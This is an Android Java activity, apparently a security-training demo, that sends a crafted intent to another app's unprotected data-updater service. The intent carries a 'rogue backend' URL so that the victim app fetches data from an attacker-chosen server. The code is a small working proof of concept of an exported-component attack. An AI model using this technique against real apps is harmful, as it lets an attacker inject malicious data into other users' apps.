package com.epam.itweek.commonsensesecurity.downloaderattaccker;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.os.Bundle;
import android.widget.Button;

import butterknife.ButterKnife;
import butterknife.InjectView;
import butterknife.OnClick;


public class AttackDownloaderActivity extends Activity {

    public static final String URL_ROGUE_BACKEND = "http://bing.com";
    @InjectView(R.id.attackDownloader) Button mAttackDownloader;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attack_downloader);
        ButterKnife.inject(this);
    }

    @OnClick(R.id.attackDownloader) void onAttackClicked() {
        Intent intent = new Intent(UnofficialDataUpdaterApi.ACTION_UPDATE_DATA);
        intent.putExtra(UnofficialDataUpdaterApi.EXTRA_URL, URL_ROGUE_BACKEND);
        intent.setClassName(UnofficialDataUpdaterApi.PACKAGE, UnofficialDataUpdaterApi.ACTIVITY);
        startService(intent);
    }

}
